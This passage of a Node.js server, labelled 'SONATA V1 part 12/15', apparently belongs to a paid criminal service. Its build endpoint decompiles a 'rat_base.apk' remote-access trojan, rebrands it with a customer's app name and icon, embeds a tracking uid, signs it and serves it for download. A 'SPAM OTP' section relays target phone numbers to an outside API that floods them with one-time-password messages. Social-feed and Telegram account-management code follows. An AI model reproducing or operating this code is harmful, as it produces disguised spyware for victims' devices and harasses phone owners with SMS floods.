    if (!fs.existsSync(RAT_BASE_APK)) return false;
    const apkMtime = fs.statSync(RAT_BASE_APK).mtimeMs;
    const decodedMtime = fs.statSync(RAT_BASE_DECODED).mtimeMs;
    return apkMtime > decodedMtime;
  } catch (_) { return true; }
}

function escapeXmlEntity(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;');
}

async function patchAllStringsXml(buildDir, appName) {
  const valuesDir = path.join(buildDir, 'res');
  if (!fs.existsSync(valuesDir)) return { patched: 0, files: [] };
  const safeName = escapeXmlEntity(appName);
  const patchedFiles = [];
  try {
    const entries = fs.readdirSync(valuesDir).filter(d => d.startsWith('values'));
    for (const dirName of entries) {
      const dirPath = path.join(valuesDir, dirName);
      if (!fs.statSync(dirPath).isDirectory()) continue;
      const stringsPath = path.join(dirPath, 'strings.xml');
      if (!fs.existsSync(stringsPath)) continue;
      try {
        let xml = await fsPromises.readFile(stringsPath, 'utf8');
        if (/<string name="app_name">/.test(xml)) {
          xml = xml.replace(/<string name="app_name">.*?<\/string>/g, `<string name="app_name">${safeName}</string>`);
          await fsPromises.writeFile(stringsPath, xml);
          patchedFiles.push(stringsPath);
        }
      } catch (_) {}
    }
  } catch (_) {}
  return { patched: patchedFiles.length, files: patchedFiles };
}

async function patchManifestLabel(buildDir, appName) {
  const manifestPath = path.join(buildDir, 'AndroidManifest.xml');
  if (!fs.existsSync(manifestPath)) return { patched: false, reason: 'manifest not found' };
  try {
    const safeName = escapeXmlEntity(appName);
    let xml = await fsPromises.readFile(manifestPath, 'utf8');

    let appPatched = false;
    xml = xml.replace(/(<application\b[^>]*?)android:label="[^"]*"/g, (m, prefix) => {
      appPatched = true;
      return `${prefix}android:label="${safeName}"`;
    });
    if (!appPatched) {
      xml = xml.replace(/(<application\b)(?![^>]*android:label=)([^>]*>)/, (m, open, rest) => {
        appPatched = true;
        return `${open} android:label="${safeName}"${rest}`;
      });
    }

    let aliasCount = 0;
    xml = xml.replace(/(<activity-alias\b[^>]*?)android:label="[^"]*"/g, (m, prefix) => {
      aliasCount++;
      return `${prefix}android:label="${safeName}"`;
    });

    await fsPromises.writeFile(manifestPath, xml);
    return { patched: true, appPatched, aliasCount };
  } catch (e) {
    return { patched: false, reason: e.message };
  }
}

app.get('/javainfo', (req, res) => {
  try {
    const bin = findJavaBinary();
    const v = getJavaVersionString() || execSync(`"${bin}" -version 2>&1`, { encoding: 'utf8', timeout: 5000 }).trim();
    res.json({ installed: true, bin, version: v });
  } catch (e) {
    res.json({ installed: false, bin: findJavaBinary(), error: e.message });
  }
});

app.post('/api/build-apk', uploadIcon.single('icon'), async (req, res) => {
  const { appName, webviewUrl, username, password, sessionKey, uid: uidBody } = req.body;

  if (!appName || !webviewUrl) {
    return res.status(400).json({ success: false, message: 'appName dan webviewUrl wajib diisi' });
  }

  if (!fs.existsSync(RAT_BASE_APK)) {
    return res.status(404).json({
      success: false,
      message: 'rat_base.apk tidak ditemukan di server.'
    });
  }

  if (!isJavaInstalled()) {
    console.log('[BUILD] Java tidak terdeteksi, coba install dulu...');
    const javaOk = await tryInstallJavaAsync();
    if (!javaOk) {
      return res.status(503).json({
        success: false,
        message: 'Java belum tersedia di server.'
      });
    }
    JAVA_BIN = findJavaBinary();
  } else {
    JAVA_BIN = findJavaBinary();
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) {
    return res.status(401).json({ success: false, message: 'User tidak ditemukan' });
  }
  if (String(user.password) !== String(password)) {
    return res.status(401).json({ success: false, message: 'Password salah' });
  }

  const uid = user.uid || crypto.createHash('md5').update(user.username).digest('hex');
  if (!user.uid) {
    user.uid = uid;
    saveDatabase(db);
  }

  const buildId = Date.now().toString();
  const buildDir = path.join(__dirname, `rat_build_${buildId}`);
  const unsignedApk = path.join(__dirname, `rat_unsigned_${buildId}.apk`);
  const outputApk = path.join(DOWNLOADS_DIR, `Rat_${buildId}.apk`);

  try {
    let buildReport = {};

    await ratQueueBuild(async () => {

      const apktoolJar = path.join(__dirname, 'apktool.jar');
      const MIN_JAR_SIZE = 5 * 1024 * 1024;

      const isJarValid = () => {
        try {
          if (!fs.existsSync(apktoolJar)) return false;
          const st = fs.statSync(apktoolJar);
          if (st.size < MIN_JAR_SIZE) return false;
          const fd = fs.openSync(apktoolJar, 'r');
          const buf = Buffer.alloc(4);
          fs.readSync(fd, buf, 0, 4, 0);
          fs.closeSync(fd);
          return buf[0] === 0x50 && buf[1] === 0x4B;
        } catch (_) { return false; }
      };

      if (!isJarValid()) {
        console.log('[BUILD] apktool.jar tidak valid. Download ulang...');
        try { if (fs.existsSync(apktoolJar)) fs.unlinkSync(apktoolJar); } catch (_) {}

        const https = require('https');
        const APKTOOL_URL = 'https://github.com/iBotPeaches/Apktool/releases/download/v2.10.0/apktool_2.10.0.jar';

        await new Promise((resolve, reject) => {
          const file = fs.createWriteStream(apktoolJar);
          https.get(APKTOOL_URL, (response) => {
            if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
              https.get(response.headers.location, (rr) => {
                rr.pipe(file);
                file.on('finish', () => file.close(resolve));
              }).on('error', reject);
            } else if (response.statusCode === 200) {
              response.pipe(file);
              file.on('finish', () => file.close(resolve));
            } else {
              file.close();
              try { fs.unlinkSync(apktoolJar); } catch (_) {}
              reject(new Error(`Download apktool gagal: HTTP ${response.statusCode}`));
            }
          }).on('error', reject);
        });

        if (!isJarValid()) {
          try { fs.unlinkSync(apktoolJar); } catch (_) {}
          throw new Error('apktool.jar masih invalid setelah download.');
        }
        console.log('[BUILD] ✅ apktool.jar berhasil didownload & valid.');
      }

      const frameworkPath = path.join(__dirname, 'apktool_framework');
      if (isDecodedCacheStale()) {
        console.log('[BUILD] Decode rat_base.apk (cache stale / belum ada)...');
        if (fs.existsSync(RAT_BASE_DECODED)) {
          try { fs.rmSync(RAT_BASE_DECODED, { recursive: true, force: true }); } catch (_) {}
        }
        await new Promise((resolve, reject) => {
          exec(
            `"${JAVA_BIN}" -jar "${apktoolJar}" d "${RAT_BASE_APK}" -o "${RAT_BASE_DECODED}" -f -p "${frameworkPath}"`,
            { maxBuffer: 1024 * 1024 * 50 },
            (error, stdout, stderr) => {
              if (error) reject(new Error(stderr || error.message));
              else resolve(stdout);
            }
          );
        });
      } else {
        console.log('[BUILD] Pakai cache rat_base_decoded (masih fresh).');
      }

      fs.cpSync(RAT_BASE_DECODED, buildDir, { recursive: true });

      const stringsResult = await patchAllStringsXml(buildDir, appName);
      buildReport.strings = stringsResult;

      const manifestResult = await patchManifestLabel(buildDir, appName);
      buildReport.manifest = manifestResult;

      const assetsDir = path.join(buildDir, 'assets');
      if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });
      await fsPromises.writeFile(
        path.join(assetsDir, 'uid.json'),
        JSON.stringify({ uid }, null, 2)
      );

      if (req.file) {
        let iconPath = req.file.path;
        const resDir = path.join(buildDir, 'res');
        const anydpi = path.join(resDir, 'mipmap-anydpi-v26');

        try {
          const pngPath = iconPath + '_converted.png';
          execSync(`ffmpeg -y -i "${iconPath}" -vf scale=192:192 "${pngPath}" 2>/dev/null`, { timeout: 15000 });
          if (fs.existsSync(pngPath)) iconPath = pngPath;
        } catch (_) {}

        if (fs.existsSync(iconPath)) {
          if (fs.existsSync(resDir)) {
            const folders = fs.readdirSync(resDir).filter(f => f.startsWith('mipmap'));
            for (const folder of folders) {
              const destDir = path.join(resDir, folder);
              try {
                fs.readdirSync(destDir).forEach(file => {
                  if (file.startsWith('ic_launcher') && file.endsWith('.png')) {
                    try { fs.copyFileSync(iconPath, path.join(destDir, file)); } catch (_) {}
                  }
                });
              } catch (_) {}
            }
          }

          if (fs.existsSync(anydpi)) {
            const adaptiveXml = `<?xml version="1.0" encoding="utf-8"?>
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@mipmap/ic_launcher"/>
    <foreground android:drawable="@mipmap/ic_launcher"/>
</adaptive-icon>`;
            try { fs.writeFileSync(path.join(anydpi, 'ic_launcher.xml'), adaptiveXml); } catch (_) {}
            try { fs.writeFileSync(path.join(anydpi, 'ic_launcher_round.xml'), adaptiveXml); } catch (_) {}
          }
        }
      }

      await new Promise((resolve, reject) => {
        exec(
          `"${JAVA_BIN}" -jar "${apktoolJar}" b "${buildDir}" -o "${unsignedApk}" --use-aapt2`,
          (error, stdout, stderr) => {
            if (error) reject(new Error(stderr || error.message));
            else resolve(stdout);
          }
        );
      });

      const signerJar = path.join(__dirname, 'uber-apk-signer.jar');
      const SIGNER_MIN = 1 * 1024 * 1024;

      const isSignerValid = () => {
        try {
          if (!fs.existsSync(signerJar)) return false;
          const st = fs.statSync(signerJar);
          if (st.size < SIGNER_MIN) return false;
          const fd = fs.openSync(signerJar, 'r');
          const buf = Buffer.alloc(4);
          fs.readSync(fd, buf, 0, 4, 0);
          fs.closeSync(fd);
          return buf[0] === 0x50 && buf[1] === 0x4B;
        } catch (_) { return false; }
      };

      if (!isSignerValid()) {
        console.log('[BUILD] uber-apk-signer.jar tidak valid. Download ulang...');
        try { if (fs.existsSync(signerJar)) fs.unlinkSync(signerJar); } catch (_) {}

        const https = require('https');
        const SIGNER_URL = 'https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar';

        await new Promise((resolve, reject) => {
          const file = fs.createWriteStream(signerJar);
          https.get(SIGNER_URL, (response) => {
            if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
              https.get(response.headers.location, (rr) => {
                rr.pipe(file);
                file.on('finish', () => file.close(resolve));
              }).on('error', reject);
            } else if (response.statusCode === 200) {
              response.pipe(file);
              file.on('finish', () => file.close(resolve));
            } else {
              file.close();
              try { fs.unlinkSync(signerJar); } catch (_) {}
              reject(new Error(`Download signer gagal: HTTP ${response.statusCode}`));
            }
          }).on('error', reject);
        });

        if (!isSignerValid()) {
          try { fs.unlinkSync(signerJar); } catch (_) {}
          throw new Error('uber-apk-signer.jar masih invalid.');
        }
        console.log('[BUILD] ✅ uber-apk-signer.jar berhasil didownload & valid.');
      }

      const keystorePath = path.join(__dirname, 'manta.jks');
      let signCmd = `"${JAVA_BIN}" -jar "${signerJar}" -a "${unsignedApk}" -o "${DOWNLOADS_DIR}"`;
      if (fs.existsSync(keystorePath)) {
        signCmd += ` --ks "${keystorePath}" --ksAlias key0 --ksPass ratapp123 --ksKeyPass ratapp123`;
      }

      await new Promise((resolve, reject) => {
        exec(signCmd, (error, stdout, stderr) => {
          if (error) reject(new Error(stderr || error.message));
          else resolve(stdout);
        });
      });

      const generated = fs.readdirSync(DOWNLOADS_DIR).find(f => f.startsWith(`rat_unsigned_${buildId}`) && f.endsWith('.apk'));
      if (generated) {
        fs.renameSync(path.join(DOWNLOADS_DIR, generated), outputApk);
      } else if (fs.existsSync(unsignedApk)) {
        fs.copyFileSync(unsignedApk, outputApk);
      }

      console.log(`[BUILD] ✅ APK siap: ${outputApk}`);
      console.log(`[BUILD] 📋 Report:`, JSON.stringify(buildReport));
    });

    res.json({
      success: true,
      downloadUrl: `/downloads/Rat_${buildId}.apk`,
      buildReport
    });

  } catch (error) {
    console.error('[BUILD] Build Error:', error);
    res.status(500).json({ success: false, message: error.message || 'Gagal build APK' });
  } finally {
    try {
      if (fs.existsSync(buildDir)) fs.rmSync(buildDir, { recursive: true, force: true });
      if (fs.existsSync(unsignedApk)) fs.rmSync(unsignedApk, { force: true });
      if (req.file && fs.existsSync(req.file.path)) fs.rmSync(req.file.path, { force: true });
      if (req.file && fs.existsSync(req.file.path + '_converted.png')) fs.rmSync(req.file.path + '_converted.png', { force: true });
    } catch (_) {}
  }
});

// ═══════════════════════════════════════════════════════════════════════
//  SPAM OTP
// ═══════════════════════════════════════════════════════════════════════
const SPAM_OTP_BASE = 'https://spamotp-api-eef5f0834c07.herokuapp.com';

app.get('/api/spamotp/start', async (req, res) => {
  const { key, target, mode = 'single', threads = 43, delay = 60, count = 10 } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ success: false, message: 'Invalid key' });

  if (!target) return res.status(400).json({ success: false, message: 'Target required' });

  let url;
  if (mode === 'single') url = `${SPAM_OTP_BASE}/api/${target}?mode=single&threads=${threads}`;
  else if (mode === 'loop') url = `${SPAM_OTP_BASE}/api/${target}?mode=loop&threads=${threads}&delay=${delay}`;
  else if (mode === 'pairing') url = `${SPAM_OTP_BASE}/api/${target}?mode=pairing&count=${count}&pairing_delay=4`;
  else return res.status(400).json({ success: false, message: 'Invalid mode' });

  try {
    const r = await axios.get(url, { timeout: 20000 });
    res.json({ success: true, data: r.data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

app.get('/api/spamotp/status', async (req, res) => {
  const { key, target, type = 'otp' } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ success: false });

  try {
    const r = await axios.get(`${SPAM_OTP_BASE}/api/${target}?mode=status&type=${type}`, { timeout: 10000 });
    res.json({ success: true, data: r.data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

app.post('/api/spamotp/stop', async (req, res) => {
  const { key, target, type = 'otp' } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ success: false });

  try {
    const r = await axios.post(`${SPAM_OTP_BASE}/api/${target}/stop?type=${type}`, {}, { timeout: 10000 });
    res.json({ success: true, data: r.data });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

app.get('/api/spamotp/providers', (req, res) => {
  res.json({
    success: true,
    providers: [
      'HRS-BRE','PlanetBan','Internet Rakyat','Royal Canin','Fastwork','Beautyhaul','Maulagi',
      'Dunia Games','Bonus Belanja','Adiraku','Saturdays','Alodokter','Absenku','Mister Aladin',
      'Tokopedia','Klik Indomaret'
    ]
  });
});

// ═══════════════════════════════════════════════════════════════════════
//  STORY API
// ═══════════════════════════════════════════════════════════════════════
const STORY_FILE = path.join(__dirname, 'stories.json');
function loadStories() {
  try { return JSON.parse(fs.readFileSync(STORY_FILE, 'utf8')); }
  catch { return []; }
}
function saveStories(s) {
  fs.writeFileSync(STORY_FILE, JSON.stringify(s, null, 2));
}

app.get('/api/stories', (req, res) => {
  const all = loadStories().filter(s => Date.now() - new Date(s.created_at).getTime() < 24 * 60 * 60 * 1000);
  saveStories(all);
  res.json(all);
});

app.post('/api/stories', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ message: 'Unauthorized' });

  const all = loadStories();
  const item = {
    id: 'story_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex'),
    username: keyInfo.username,
    type: req.body.type || 'text',
    content: String(req.body.content || ''),
    bg_color: req.body.bg_color || '#0d0d1a',
    txt_color: req.body.txt_color || '#00F5FF',
    thumbnail: '',
    created_at: new Date().toISOString(),
    viewers: []
  };
  all.push(item);
  saveStories(all);
  res.status(201).json(item);
});

app.post('/api/stories/upload', uploadStory.single('file'), (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ message: 'Unauthorized' });
  if (!req.file) return res.status(400).json({ message: 'File required' });

  const url = `${req.protocol}://${req.get('host')}/uploads/stories/${path.basename(req.file.path)}`;
  const all = loadStories();
  const item = {
    id: 'story_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex'),
    username: keyInfo.username,
    type: req.body.type || 'image',
    content: url,
    bg_color: '#0d0d1a',
    txt_color: '#00F5FF',
    thumbnail: url,
    created_at: new Date().toISOString(),
    viewers: []
  };
  all.push(item);
  saveStories(all);
  res.status(201).json(item);
});

app.post('/api/stories/:id/view', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ message: 'Unauthorized' });

  const all = loadStories();
  const s = all.find(x => x.id === req.params.id);
  if (!s) return res.sendStatus(404);
  if (!s.viewers.includes(keyInfo.username)) s.viewers.push(keyInfo.username);
  saveStories(all);
  res.json({ success: true });
});

app.delete('/api/stories/:id', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ message: 'Unauthorized' });

  const all = loadStories();
  const s = all.find(x => x.id === req.params.id);
  if (!s) return res.status(404).json({ success: false, message: 'Story tidak ditemukan.' });
  if (s.username !== keyInfo.username) return res.status(403).json({ success: false, message: 'Hanya pemilik.' });
  saveStories(all.filter(x => x.id !== req.params.id));
  res.json({ success: true });
});

// ═══════════════════════════════════════════════════════════════════════
//  SOCIAL MEDIA API
// ═══════════════════════════════════════════════════════════════════════
const SOCIAL_FILE = path.join(__dirname, 'social.json');
function loadSocial() {
  try { return JSON.parse(fs.readFileSync(SOCIAL_FILE, 'utf8')); }
  catch { return { users: {}, posts: [] }; }
}
function saveSocial(s) {
  fs.writeFileSync(SOCIAL_FILE, JSON.stringify(s, null, 2));
}

function getUserFromBearer(req) {
  const auth = req.headers['authorization'] || '';
  const token = auth.replace('Bearer ', '').trim();
  if (!token) return null;
  const keyInfo = activeKeys[token];
  if (!keyInfo) return null;
  const db = loadDatabase();
  return db.find(u => u.username === keyInfo.username) || null;
}

app.get('/api/users', (req, res) => {
  const user = getUserFromBearer(req);
  if (!user) return res.status(401).json({ message: 'Unauthorized' });
  const s = loadSocial();
  const db = loadDatabase();
  const names = [...new Set([...db.map(u => u.username), ...Object.keys(s.users)])];
  res.json(names.map(n => ({
    id: n,
    name: n,
    username: n,
    profilePic: s.users[n]?.profilePic || null,
    followers: s.users[n]?.followers || [],
    following: s.users[n]?.following || []
  })));
});

app.get('/api/posts', (req, res) => {
  const user = getUserFromBearer(req);
  if (!user) return res.status(401).json({ message: 'Unauthorized' });
  res.json(loadSocial().posts.slice().reverse());
});

app.get('/api/posts/user/:id', (req, res) => {
  const user = getUserFromBearer(req);
  if (!user) return res.status(401).json({ message: 'Unauthorized' });
  res.json(loadSocial().posts.filter(p => p.userId === req.params.id).reverse());
});

app.post('/api/follow', (req, res) => {
  const user = getUserFromBearer(req);
  if (!user) return res.status(401).json({ message: 'Unauthorized' });
  const s = loadSocial();
  const a = String(user.username);
  const b = String(req.body.targetId || '').trim();
  if (!b || a === b) return res.status(400).json({ message: 'targetId invalid' });

  s.users[a] ??= { followers: [], following: [] };
  s.users[b] ??= { followers: [], following: [] };

  const i = s.users[a].following.indexOf(b);
  if (i >= 0) {
    s.users[a].following.splice(i, 1);
    s.users[b].followers = s.users[b].followers.filter(x => x !== a);
  } else {
    s.users[a].following.push(b);
    if (!s.users[b].followers.includes(a)) s.users[b].followers.push(a);
  }
  saveSocial(s);
  res.json({ success: true });
});

app.post('/api/like', (req, res) => {
  const user = getUserFromBearer(req);
  if (!user) return res.status(401).json({ message: 'Unauthorized' });
  const s = loadSocial();
  const p = s.posts.find(x => x.id === String(req.body.postId));
  if (!p) return res.sendStatus(404);

  p._likedBy = p._likedBy || [];
  const i = p._likedBy.indexOf(user.username);
  if (i >= 0) {
    p._likedBy.splice(i, 1);
    p.likes = Math.max(0, (p.likes || 0) - 1);
  } else {
    p._likedBy.push(user.username);
    p.likes = (p.likes || 0) + 1;
  }
  saveSocial(s);
  res.json({ success: true, likes: p.likes });
});

app.post('/api/comment', (req, res) => {
  const user = getUserFromBearer(req);
  if (!user) return res.status(401).json({ message: 'Unauthorized' });
  const s = loadSocial();
  const p = s.posts.find(x => x.id === String(req.body.postId));
  if (!p) return res.sendStatus(404);

  p.comments = p.comments || [];
  p.comments.push({
    userId: user.username,
    username: user.username,
    text: String(req.body.text || '').slice(0, 500),
    createdAt: new Date().toISOString()
  });
  saveSocial(s);
  res.status(201).json({ success: true });
});

app.post('/api/upload-video', uploadSocial.single('video'), (req, res) => {
  const user = getUserFromBearer(req);
  if (!user || !req.file) return res.status(401).json({ message: 'Unauthorized' });
  const s = loadSocial();
  const id = 'post_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
  s.posts.push({
    id,
    userId: user.username,
    username: user.username,
    caption: String(req.body.caption || ''),
    videoUrl: `${req.protocol}://${req.get('host')}/uploads/social/${path.basename(req.file.path)}`,
    thumbnail: null,
    createdAt: new Date().toISOString(),
    likes: 0,
    comments: []
  });
  saveSocial(s);
  res.status(201).json({ success: true });
});

app.post('/api/upload-pp', uploadSocial.single('profilePic'), (req, res) => {
  const user = getUserFromBearer(req);
  if (!user || !req.file) return res.status(401).json({ message: 'Unauthorized' });
  const s = loadSocial();
  s.users[user.username] ??= { followers: [], following: [] };
  s.users[user.username].profilePic = `${req.protocol}://${req.get('host')}/uploads/social/${path.basename(req.file.path)}`;
  saveSocial(s);
  res.status(201).json({ success: true, profilePic: s.users[user.username].profilePic });
});

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 12/15");
console.log("    STATUS : BUILDER + OTP + STORY + SOCIAL OK");
console.log("    FIX    : NAMA APK (strings + manifest + aapt2 + cache)");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  Part 13/15: TELEGRAM BOT HANDLER — Helper, Text, Command
// ═══════════════════════════════════════════════════════════════════════

function getBotHeaderText(roleLabel) {
  return `
<b>BOT MANAGER AKUN SONATA</b>

PASTIKAN ANDA JOIN GRUP RESMI SONATA

1. DILARANG BAGI AKUN APK FREE
2. 1 TELEGRAM = 1 AKUN
3. JIKA ANDA KELUAR DARI GRUP AKUN ANDA DI HAPUS

SALAM RISPEK DARI Kingz DEVELOPER 😹
SAYA DEV Kingz IZINN 🗿
ROLE BUSUK LU DECK (${roleLabel || 'MEMBER'})
`.trim();
}

function telegramUserHasAccount(tgId) {
  const db = loadDatabase();
  return db.some(u => Number(u.telegramId) === Number(tgId));
}

function getUserByTelegramId(tgId) {
  const db = loadDatabase();
  return db.find(u => Number(u.telegramId) === Number(tgId));
}

async function notifyAccountCreated(account, source = 'TELEGRAM') {
  const groupId = process.env.TELEGRAM_CREATE_NOTIFY_GROUP_ID;
  if (!bot || !groupId) return;
  const esc = (v) => String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const text = `🔥 <b>SONATA — AKUN BARU DIBUAT</b>\n\n<b>Username:</b> <code>${esc(account.username)}</code>\n<b>Role:</b> <b>${esc(account.role).toUpperCase()}</b>\n<b>Expired:</b> <b>${esc(account.expiredDate)}</b>\n<b>Sumber:</b> <b>${esc(source)}</b>`;
  try { await bot.sendMessage(groupId, text, { parse_mode: 'HTML' }); } catch (e) { console.error('•SONATA• Gagal kirim notif create akun:', e.message); }
}

function createAccountFromTelegram({ tgId, tgUsername, role, username, password, days }) {
  const db = loadDatabase();

  if (telegramUserHasAccount(tgId)) {
    return { ok: false, message: '❌ Kamu sudah punya akun. Hapus dulu kalau mau bikin baru.' };
  }

  if (db.find(u => u.username === username)) {
    return { ok: false, message: '❌ Username sudah dipakai orang lain.' };
  }

  if (!username || username.length < 3) {
    return { ok: false, message: '❌ Username minimal 3 karakter.' };
  }

  if (!password || password.length < 4) {
    return { ok: false, message: '❌ Password minimal 4 karakter.' };
  }

  const roleKey = String(role || 'member').toLowerCase();
  const add = Number(days);
  if (!Number.isInteger(add) || add <= 0 || add > 3650) {
    return { ok: false, message: '❌ Durasi hari tidak valid (1 - 3650).' };
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + add);
  const expiredDate = expired.toISOString().split("T")[0];

  const uid = crypto.createHash('md5').update(username).digest('hex');

  const createdAccount = {
    username,
    password,
    role: roleKey,
    uid,
    expiredDate,
    createdAt: new Date().toISOString(),
    telegramId: tgId,
    telegramUsername: tgUsername || '',
    createdBy: 'TELEGRAM_BOT',
    accountType: 'TELEGRAM'
  };
  db.push(createdAccount);
  saveDatabase(db);
  rememberUserIdentity(createdAccount, 'TELEGRAM_BOT');

  const createdUser = { username, password, role: roleKey, expiredDate, uid, telegramId: tgId };
  void notifyAccountCreated(createdUser, 'TELEGRAM');
  return { ok: true, user: createdUser };
}

function deleteOwnAccount(tgId) {
  const db = loadDatabase();
  const idx = db.findIndex(u => Number(u.telegramId) === Number(tgId));
  if (idx === -1) return { ok: false, message: '❌ Kamu belum punya akun.' };
  const removed = db.splice(idx, 1)[0];
  rememberUserIdentity(removed, 'TELEGRAM_DELETED');
  saveDatabase(db);
  return { ok: true, user: removed };
}

function buildFullAccountReport(username) {
  const db = loadDatabase();
  const u = db.find(x => String(x.username).toLowerCase() === String(username).toLowerCase());
  if (!u) return null;

  const esc = (v) => String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  let sisaInfo = '-';
  if (u.expiredDate) {
    const expMs = new Date(u.expiredDate + 'T23:59:59Z').getTime();
    const diffMs = expMs - Date.now();
    const days = Math.ceil(diffMs / 86400000);
    if (days > 0) sisaInfo = `${days} hari`;
    else if (days === 0) sisaInfo = 'expired hari ini';
    else sisaInfo = `expired ${Math.abs(days)} hari lalu`;
  }

  const purchases = loadPurchases();
  const income = purchases
    .filter(x => String(x.account?.username || x.username || '').toLowerCase() === String(u.username).toLowerCase())
    .filter(x => String(x.status || '').toLowerCase() === 'accepted')
    .reduce((n, x) => n + (Number(x.price) || 0), 0);

  const link = u.groupLink;
  const linkStr = link && link.inviteLink
    ? `${esc(link.inviteLink)}\n(role: ${esc(link.groupRole || '-')}, claim: ${esc(link.claimedAt || '-')})`
    : 'belum klaim';

  return (
    `🔍 <b>CEK AKUN LENGKAP</b>\n\n` +
    `<b>Username   :</b> <code>${esc(u.username)}</code>\n` +
    `<b>Password   :</b> ****\n` +
    `<b>Role       :</b> <b>${esc((u.role || 'member').toUpperCase())}</b>\n` +
    `<b>UID        :</b> <code>${esc(u.uid || '-')}</code>\n` +
    `<b>Expired    :</b> ${esc(u.expiredDate || '-')}\n` +
    `<b>Sisa       :</b> ${sisaInfo}\n` +
    `<b>Created by :</b> <code>${esc(u.createdBy || '-')}</code>\n` +
    `<b>Created at :</b> ${esc(u.createdAt || '-')}\n` +
    `<b>Telegram ID:</b> <code>${esc(u.telegramId || '-')}</code>\n` +
    `<b>TG Linked  :</b> ${esc(u.telegramLinkedAt || '-')}\n` +
    `<b>Account type:</b> ${esc(u.accountType || '-')}\n` +
    `<b>Link Group :</b> ${linkStr}\n` +
    `<b>Total Income:</b> Rp ${income.toLocaleString('id-ID')}`
  );
}

function generateBerkahAccounts({ role, count, createdByTelegramId, createdByUsername }) {
  if (!BERKAH_CONFIG.ALLOWED_ROLES.includes(role)) {
    return { ok: false, message: `❌ Role tidak diizinkan. Pilihan: ${BERKAH_CONFIG.ALLOWED_ROLES.join(', ').toUpperCase()}` };
  }
  const n = Number(count);
  if (!Number.isInteger(n) || n < 1 || n > BERKAH_CONFIG.MAX_PER_BATCH) {
    return { ok: false, message: `❌ Jumlah harus 1-${BERKAH_CONFIG.MAX_PER_BATCH}.` };
  }

  if (role === 'owner') {
    const used = getBerkahOwnerCountToday(createdByUsername);
    const remain = BERKAH_CONFIG.OWNER_DAILY_CAP - used;
    if (remain <= 0) {
      return { ok: false, message: `❌ Cap harian OWNER habis. Max ${BERKAH_CONFIG.OWNER_DAILY_CAP} per hari.` };
    }
    if (n > remain) {
      return { ok: false, message: `❌ Cap harian OWNER tersisa ${remain}. Kurangi jumlah atau pilih role lain.` };
    }
  }

  const db = loadDatabase();
  const results = [];
  const expDate = new Date();
  expDate.setDate(expDate.getDate() + BERKAH_CONFIG.DURATION_DAYS);
  const expiredDate = expDate.toISOString().split('T')[0];

  for (let i = 0; i < n; i++) {
    let username, attempts = 0;
    do {
      const rand = crypto.randomBytes(Math.ceil(BERKAH_CONFIG.USERNAME_HEX_LEN / 2)).toString('hex').slice(0, BERKAH_CONFIG.USERNAME_HEX_LEN);
      username = BERKAH_CONFIG.USERNAME_PREFIX + rand;
      attempts++;
      if (attempts > 20) break;
    } while (db.find(x => x.username === username));

    if (db.find(x => x.username === username)) {
      continue;
    }

    const password = crypto.randomBytes(8).toString('base64url').slice(0, BERKAH_CONFIG.PASSWORD_LEN);
    const uid = crypto.createHash('md5').update(username).digest('hex');

    const account = {
      username,
      password,
      role,
      uid,
      expiredDate,
      createdAt: new Date().toISOString(),
      createdBy: `BERKAH_${createdByUsername}`,
      accountType: 'BERKAH',
      day: BERKAH_CONFIG.DURATION_DAYS
    };
    db.push(account);
    results.push({ username, password });
  }

  if (results.length === 0) {
    return { ok: false, message: '❌ Gagal generate akun (semua username bentrok).' };
  }

  saveDatabase(db);

  if (role === 'owner') incrementBerkahOwnerToday(createdByUsername, results.length);

  for (const r of results) {
    pushCreateHistory({
      id: 'berkah_' + Date.now() + '_' + r.username,
      username: r.username,
      role,
      day: BERKAH_CONFIG.DURATION_DAYS,
      expiredDate,
      createdBy: `BERKAH_${createdByUsername}`,
      status: 'accepted',
      note: `Berkah batch by ${createdByUsername} (TG ${createdByTelegramId})`,
      createdAt: new Date().toISOString()
    });
  }

  return { ok: true, accounts: results, role, count: results.length, expiredDate };
}

async function sendMainMenu(chatId, userId) {
  const role = await resolveTelegramRole(userId);
  const roleLabel = role || 'MEMBER';

  const header = getBotHeaderText(roleLabel);

  if (!role) {
    const cfg = loadTelegramConfig();
    const id = Number(userId);
    const isOwnerOrDev = (cfg.ownerList || []).map(Number).includes(id) ||
                         (cfg.devList || []).map(Number).includes(id);
    if (!isOwnerOrDev) {
      return bot.sendMessage(chatId, header + `\n\n⚠️ Kamu belum join grup role manapun.\nJoin dulu salah satu grup resmi SONATA.`, { parse_mode: 'HTML' });
    }
  }

  const finalRole = role || 'PEMULA';

